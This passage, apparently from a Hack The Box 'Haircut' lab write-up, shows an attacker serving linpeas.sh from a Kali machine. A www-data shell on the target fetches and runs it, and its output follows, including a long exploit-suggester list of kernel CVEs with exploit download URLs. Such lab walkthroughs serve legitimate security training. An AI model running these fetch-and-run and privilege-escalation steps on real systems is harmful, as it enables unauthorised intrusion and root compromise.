class="line">1601</span><br><span class="line">1602</span><br><span class="line">1603</span><br><span class="line">1604</span><br><span class="line">1605</span><br><span class="line">1606</span><br><span class="line">1607</span><br><span class="line">1608</span><br><span class="line">1609</span><br><span class="line">1610</span><br><span class="line">1611</span><br><span class="line">1612</span><br><span class="line">1613</span><br><span class="line">1614</span><br><span class="line">1615</span><br><span class="line">1616</span><br><span class="line">1617</span><br><span class="line">1618</span><br><span class="line">1619</span><br><span class="line">1620</span><br><span class="line">1621</span><br><span class="line">1622</span><br><span class="line">1623</span><br><span class="line">1624</span><br><span class="line">1625</span><br><span class="line">1626</span><br><span class="line">1627</span><br><span class="line">1628</span><br><span class="line">1629</span><br><span class="line">1630</span><br><span class="line">1631</span><br><span class="line">1632</span><br><span class="line">1633</span><br><span class="line">1634</span><br><span class="line">1635</span><br><span class="line">1636</span><br><span class="line">1637</span><br><span class="line">1638</span><br><span class="line">1639</span><br><span class="line">1640</span><br><span class="line">1641</span><br><span class="line">1642</span><br><span class="line">1643</span><br><span class="line">1644</span><br><span class="line">1645</span><br><span class="line">1646</span><br><span class="line">1647</span><br><span class="line">1648</span><br><span class="line">1649</span><br><span class="line">1650</span><br><span class="line">1651</span><br><span class="line">1652</span><br><span class="line">1653</span><br><span class="line">1654</span><br><span class="line">1655</span><br><span class="line">1656</span><br><span class="line">1657</span><br><span class="line">1658</span><br><span class="line">1659</span><br><span class="line">1660</span><br><span class="line">1661</span><br><span class="line">1662</span><br><span class="line">1663</span><br><span class="line">1664</span><br><span class="line">1665</span><br><span class="line">1666</span><br><span class="line">1667</span><br><span class="line">1668</span><br><span class="line">1669</span><br><span class="line">1670</span><br><span class="line">1671</span><br><span class="line">1672</span><br><span class="line">1673</span><br><span class="line">1674</span><br><span class="line">1675</span><br><span class="line">1676</span><br><span class="line">1677</span><br><span class="line">1678</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/htb-tools]<br>└─$ python3 -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>10.10.10.24 - - [03/Jan/2024 17:33:18] <span class="hljs-string">&quot;GET /linpeas.sh HTTP/1.1&quot;</span> 200 -<br><br><br>www-data@haircut:/tmp$ wget http://10.10.14.4/linpeas.sh<br>wget http://10.10.14.4/linpeas.sh<br>--2024-01-03 10:33:16--  http://10.10.14.4/linpeas.sh<br>Connecting to 10.10.14.4:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 847920 (828K) [text/x-sh]<br>Saving to: <span class="hljs-string">&#x27;linpeas.sh&#x27;</span><br><br>linpeas.sh          100%[===================&gt;] 828.05K   225KB/s    <span class="hljs-keyword">in</span> 3.7s    <br><br>2024-01-03 10:33:22 (225 KB/s) - <span class="hljs-string">&#x27;linpeas.sh&#x27;</span> saved [847920/847920]<br><br>www-data@haircut:/tmp$ <br><br><br>www-data@haircut:/tmp$ <span class="hljs-built_in">chmod</span> +x linpeas.sh<br><span class="hljs-built_in">chmod</span> +x linpeas.sh<br>www-data@haircut:/tmp$ ./linpeas.sh<br>./linpeas.sh<br><br><br>                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄<br>                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄<br>             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄<br>         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄<br>         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄<br>         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄<br>         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄<br>         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ <br>         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄<br>         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄<br>         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄<br>         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄<br>         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄<br>         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄<br>         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄<br>         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄<br>         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ <br>          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ <br>         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄<br>         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄<br>         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄<br>          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀<br>               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀<br>                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀<br><br>    /---------------------------------------------------------------------------------\<br>    |                             Do you like PEASS?                                  |  <br>    |---------------------------------------------------------------------------------|  <br>    |         Get the latest version    :     https://github.com/sponsors/carlospolop |  <br>    |         Follow on Twitter         :     @hacktricks_live                        |  <br>    |         Respect on HTB            :     SirBroccoli                             |  <br>    |---------------------------------------------------------------------------------|  <br>    |                                 Thank you!                                      |  <br>    \---------------------------------------------------------------------------------/  <br>          linpeas-ng by carlospolop                                                      <br>                                                                                         <br>ADVISORY: This script should be used <span class="hljs-keyword">for</span> authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner<span class="hljs-string">&#x27;s permission.                                                                          </span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string">Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist                                                                         </span><br><span class="hljs-string"> LEGEND:                                                                                 </span><br><span class="hljs-string">  RED/YELLOW: 95% a PE vector</span><br><span class="hljs-string">  RED: You should take a look to it</span><br><span class="hljs-string">  LightCyan: Users with console</span><br><span class="hljs-string">  Blue: Users without console &amp; mounted devs</span><br><span class="hljs-string">  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) </span><br><span class="hljs-string">  LightMagenta: Your username</span><br><span class="hljs-string"></span><br><span class="hljs-string"> Starting linpeas. Caching Writable Folders...</span><br><span class="hljs-string"></span><br><span class="hljs-string">                               ╔═══════════════════╗</span><br><span class="hljs-string">═══════════════════════════════╣ Basic information ╠═══════════════════════════════      </span><br><span class="hljs-string">                               ╚═══════════════════╝                                     </span><br><span class="hljs-string">OS: Linux version 4.4.0-78-generic (buildd@lgw01-11) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017</span><br><span class="hljs-string">User &amp; Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">Hostname: haircut</span><br><span class="hljs-string">Writable folder: /dev/shm</span><br><span class="hljs-string">[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)                                                                                 </span><br><span class="hljs-string">[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)               </span><br><span class="hljs-string">[+] /bin/nc is available for network discovery &amp; port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                    </span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string"></span><br><span class="hljs-string">Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE                                                                    </span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string">                              ╔════════════════════╗</span><br><span class="hljs-string">══════════════════════════════╣ System Information ╠══════════════════════════════       </span><br><span class="hljs-string">                              ╚════════════════════╝                                     </span><br><span class="hljs-string">╔══════════╣ Operative system</span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits       </span><br><span class="hljs-string">Linux version 4.4.0-78-generic (buildd@lgw01-11) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017</span><br><span class="hljs-string">Distributor ID: Ubuntu</span><br><span class="hljs-string">Description:    Ubuntu 16.04.2 LTS</span><br><span class="hljs-string">Release:        16.04</span><br><span class="hljs-string">Codename:       xenial</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Sudo version</span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version          </span><br><span class="hljs-string">Sudo version 1.8.16                                                                      </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ PATH</span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses  </span><br><span class="hljs-string">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                             </span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Date &amp; uptime</span><br><span class="hljs-string">Wed Jan  3 10:34:17 CET 2024                                                             </span><br><span class="hljs-string"> 10:34:17 up  1:17,  0 users,  load average: 0.23, 0.05, 0.02</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)</span><br><span class="hljs-string">disk                                                                                     </span><br><span class="hljs-string">sda</span><br><span class="hljs-string">sda1</span><br><span class="hljs-string">sda2</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Unmounted file-system?</span><br><span class="hljs-string">╚ Check if you can mount umounted devices                                                </span><br><span class="hljs-string">/dev/sda1        /               ext4    errors=remount-ro 0       1                     </span><br><span class="hljs-string">/dev/sda2        none            swap    sw              0       0</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Environment</span><br><span class="hljs-string">╚ Any private information inside environment variables?                                  </span><br><span class="hljs-string">HISTFILESIZE=0                                                                           </span><br><span class="hljs-string">USER=www-data</span><br><span class="hljs-string">SHLVL=1</span><br><span class="hljs-string">HOME=/var/www</span><br><span class="hljs-string">OLDPWD=/home/maria</span><br><span class="hljs-string">_=./linpeas.sh</span><br><span class="hljs-string">HISTSIZE=0</span><br><span class="hljs-string">PWD=/tmp</span><br><span class="hljs-string">HISTFILE=/dev/null</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Searching Signature verification failed in dmesg</span><br><span class="hljs-string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                                                            </span><br><span class="hljs-string">dmesg Not Found                                                                          </span><br><span class="hljs-string">                                                                                         </span><br><span class="hljs-string">╔══════════╣ Executing Linux Exploit Suggester</span><br><span class="hljs-string">╚ https://github.com/mzet-/linux-exploit-suggester                                       </span><br><span class="hljs-string">cat: write error: Broken pipe                                                            </span><br><span class="hljs-string">cat: write error: Broken pipe</span><br><span class="hljs-string">cat: write error: Broken pipe</span><br><span class="hljs-string">cat: write error: Broken pipe</span><br><span class="hljs-string">cat: write error: Broken pipe</span><br><span class="hljs-string">cat: write error: Broken pipe</span><br><span class="hljs-string">cat: write error: Broken pipe</span><br><span class="hljs-string">cat: write error: Broken pipe</span><br><span class="hljs-string">cat: write error: Broken pipe</span><br><span class="hljs-string">cat: write error: Broken pipe</span><br><span class="hljs-string">cat: write error: Broken pipe</span><br><span class="hljs-string">cat: write error: Broken pipe</span><br><span class="hljs-string">[+] [CVE-2017-16995] eBPF_verifier</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html</span><br><span class="hljs-string">   Exposure: highly probable</span><br><span class="hljs-string">   Tags: debian=9.0&#123;kernel:4.9.0-3-amd64&#125;,fedora=25|26|27,ubuntu=14.04&#123;kernel:4.4.0-89-generic&#125;,[ ubuntu=(16.04|17.04) ]&#123;kernel:4.(8|10).0-(19|28|45)-generic&#125;</span><br><span class="hljs-string">   Download URL: https://www.exploit-db.com/download/45010</span><br><span class="hljs-string">   Comments: CONFIG_BPF_SYSCALL needs to be set &amp;&amp; kernel.unprivileged_bpf_disabled != 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2016-5195] dirtycow</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span><br><span class="hljs-string">   Exposure: highly probable</span><br><span class="hljs-string">   Tags: debian=7|8,RHEL=5&#123;kernel:2.6.(18|24|33)-*&#125;,RHEL=6&#123;kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31&#125;,RHEL=7&#123;kernel:3.10.0-*|4.2.0-0.21.el7&#125;,[ ubuntu=16.04|14.04|12.04 ]</span><br><span class="hljs-string">   Download URL: https://www.exploit-db.com/download/40611</span><br><span class="hljs-string">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2016-5195] dirtycow 2</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span><br><span class="hljs-string">   Exposure: highly probable</span><br><span class="hljs-string">   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04&#123;kernel:2.6.32-21-generic&#125;,[ ubuntu=16.04 ]&#123;kernel:4.4.0-21-generic&#125;</span><br><span class="hljs-string">   Download URL: https://www.exploit-db.com/download/40839</span><br><span class="hljs-string">   ext-url: https://www.exploit-db.com/download/40847</span><br><span class="hljs-string">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2021-4034] PwnKit</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt</span><br><span class="hljs-string">   Exposure: probable</span><br><span class="hljs-string">   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro</span><br><span class="hljs-string">   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2021-3156] sudo Baron Samedit 2</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt</span><br><span class="hljs-string">   Exposure: probable</span><br><span class="hljs-string">   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10</span><br><span class="hljs-string">   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2017-7308] af_packet</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html</span><br><span class="hljs-string">   Exposure: probable</span><br><span class="hljs-string">   Tags: [ ubuntu=16.04 ]&#123;kernel:4.8.0-(34|36|39|41|42|44|45)-generic&#125;</span><br><span class="hljs-string">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c</span><br><span class="hljs-string">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c</span><br><span class="hljs-string">   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at &#x27;</span>ext-url<span class="hljs-string">&#x27; adds support for additional kernels</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2017-6074] dccp</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3</span><br><span class="hljs-string">   Exposure: probable</span><br><span class="hljs-string">   Tags: [ ubuntu=(14.04|16.04) ]&#123;kernel:4.4.0-62-generic&#125;</span><br><span class="hljs-string">   Download URL: https://www.exploit-db.com/download/41458</span><br><span class="hljs-string">   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2017-1000112] NETIF_F_UFO</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1</span><br><span class="hljs-string">   Exposure: probable</span><br><span class="hljs-string">   Tags: ubuntu=14.04&#123;kernel:4.4.0-*&#125;,[ ubuntu=16.04 ]&#123;kernel:4.8.0-*&#125;</span><br><span class="hljs-string">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c</span><br><span class="hljs-string">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c</span><br><span class="hljs-string">   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at &#x27;</span>ext-url<span class="hljs-string">&#x27; adds support for additional distros/kernels</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2016-8655] chocobo_root</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1</span><br><span class="hljs-string">   Exposure: probable</span><br><span class="hljs-string">   Tags: [ ubuntu=(14.04|16.04) ]&#123;kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic&#125;</span><br><span class="hljs-string">   Download URL: https://www.exploit-db.com/download/40871</span><br><span class="hljs-string">   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2016-4557] double-fdput()</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808</span><br><span class="hljs-string">   Exposure: probable</span><br><span class="hljs-string">   Tags: [ ubuntu=16.04 ]&#123;kernel:4.4.0-21-generic&#125;</span><br><span class="hljs-string">   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip</span><br><span class="hljs-string">   Comments: CONFIG_BPF_SYSCALL needs to be set &amp;&amp; kernel.unprivileged_bpf_disabled != 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2016-1247] nginxed-root.sh</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</span><br><span class="hljs-string">   Exposure: probable</span><br><span class="hljs-string">   Tags: debian=8,[ ubuntu=14.04|16.04|16.10 ]</span><br><span class="hljs-string">   Download URL: https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh</span><br><span class="hljs-string">   Comments: Rooting depends on cron.daily (up to 24h of delay). Affected: deb8: &lt;1.6.2; 14.04: &lt;1.4.6; 16.04: 1.10.0; gentoo: &lt;1.10.2-r3</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/</span><br><span class="hljs-string">https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/</span><br><span class="hljs-string">   Exposure: less probable</span><br><span class="hljs-string">   Tags: ubuntu=(22.04)&#123;kernel:5.15.0-27-generic&#125;</span><br><span class="hljs-string">   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c</span><br><span class="hljs-string">   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2022-2586] nft_object UAF</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5</span><br><span class="hljs-string">   Exposure: less probable</span><br><span class="hljs-string">   Tags: ubuntu=(20.04)&#123;kernel:5.12.13&#125;</span><br><span class="hljs-string">   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1</span><br><span class="hljs-string">   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2021-3156] sudo Baron Samedit</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt</span><br><span class="hljs-string">   Exposure: less probable</span><br><span class="hljs-string">   Tags: mint=19,ubuntu=18|20, debian=10</span><br><span class="hljs-string">   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2021-22555] Netfilter heap out-of-bounds write</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html</span><br><span class="hljs-string">   Exposure: less probable</span><br><span class="hljs-string">   Tags: ubuntu=20.04&#123;kernel:5.8.0-*&#125;</span><br><span class="hljs-string">   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c</span><br><span class="hljs-string">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c</span><br><span class="hljs-string">   Comments: ip_tables kernel module must be loaded</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2019-18634] sudo pwfeedback</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/</span><br><span class="hljs-string">   Exposure: less probable</span><br><span class="hljs-string">   Tags: mint=19</span><br><span class="hljs-string">   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c</span><br><span class="hljs-string">   Comments: sudo configuration requires pwfeedback to be enabled.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2019-15666] XFRM_UAF</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc</span><br><span class="hljs-string">   Exposure: less probable</span><br><span class="hljs-string">   Download URL: </span><br><span class="hljs-string">   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2018-1000001] RationalLove</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/</span><br><span class="hljs-string">   Exposure: less probable</span><br><span class="hljs-string">   Tags: debian=9&#123;libc6:2.24-11+deb9u1&#125;,ubuntu=16.04.3&#123;libc6:2.23-0ubuntu9&#125;</span><br><span class="hljs-string">   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c</span><br><span class="hljs-string">   Comments: kernel.unprivileged_userns_clone=1 required</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2017-5618] setuid screen v4.5.0 LPE</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://seclists.org/oss-sec/2017/q1/184</span><br><span class="hljs-string">   Exposure: less probable</span><br><span class="hljs-string">   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt</span><br><span class="hljs-string">   Exposure: less probable</span><br><span class="hljs-string">   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611</span><br><span class="hljs-string">   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c</span><br><span class="hljs-string">   Comments: Uses &quot;Stack Clash&quot; technique, works against most SUID-root binaries</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2017-1000253] PIE_stack_corruption</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt</span><br><span class="hljs-string">   Exposure: less probable</span><br><span class="hljs-string">   Tags: RHEL=6,RHEL=7&#123;kernel:3.10.0-514.21.2|3.10.0-514.26.1&#125;</span><br><span class="hljs-string">   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2016-9793] SO_&#123;SND|RCV&#125;BUFFORCE</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793</span><br><span class="hljs-string">   Exposure: less probable</span><br><span class="hljs-string">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c</span><br><span class="hljs-string">   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2016-2384] usb-midi</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: https://xairy.github.io/blog/2016/cve-2016-2384</span><br><span class="hljs-string">   Exposure: less probable</span><br><span class="hljs-string">   Tags: ubuntu=14.04,fedora=22</span><br><span class="hljs-string">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c</span><br><span class="hljs-string">   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] [CVE-2016-0728] keyring</span><br><span class="hljs-string"></span><br><span class="hljs-string">   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/</span><br><span class="hljs-string">   Exposure: less probable</span><br><span class="hljs-string">   Download URL: https://www.exploit-db.com/download/40003</span><br><span class="hljs-string">   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Executing Linux Exploit Suggester 2</span><br><span class="hljs-string">╚ https://github.com/jondonas/linux-exploit-suggester-2                                  </span><br><span class="hljs-string">  [1] af_packet                                                                          </span><br><span class="hljs-string">      CVE-2016-8655</span><br><span class="hljs-string">      Source: http://www.exploit-db.com/exploits/40871</span><br><span class="hljs-string">  [2] exploit_x</span><br><span class="hljs-string">      CVE-2018-14665</span><br><span class="hljs-string">      Source: http://www.exploit-db.com/exploits/45697</span><br><span class="hljs-string">  [3] get_rekt</span><br><span class="hljs-string">      CVE-2017-16695</span><br><span class="hljs-string">      Source: http://www.exploit-db.com/exploits/45010</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Protections</span><br><span class="hljs-string">═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.</span><br><span class="hljs-string">apparmor module is loaded.</span><br><span class="hljs-string">═╣ AppArmor profile? .............. unconfined</span><br><span class="hljs-string">═╣ is linuxONE? ................... s390x Not Found</span><br><span class="hljs-string">═╣ grsecurity present? ............ grsecurity Not Found                                 </span><br><span class="hljs-string">═╣ PaX bins present? .............. PaX Not Found                                        </span><br><span class="hljs-string">═╣ Execshield enabled? ............ Execshield Not Found                                 </span><br><span class="hljs-string">═╣ SELinux enabled? ............... sestatus Not Found                                   </span><br><span class="hljs-string">═╣ Seccomp enabled? ............... disabled                                             </span><br><span class="hljs-string">═╣ User namespace? ................ enabled</span><br><span class="hljs-string">═╣ Cgroup2 enabled? ............... disabled</span><br><span class="hljs-string">═╣ Is ASLR enabled? ............... Yes</span><br><span class="hljs-string">═╣ Printer? ....................... No</span><br><span class="hljs-string">═╣ Is this a virtual machine? ..... Yes (vmware)                                         </span><br><span class="hljs-string"></span><br><span class="hljs-string">                                   ╔═══════════╗</span><br><span class="hljs-string">═══════════════════════════════════╣ Container ╠═══════════════════════════════════    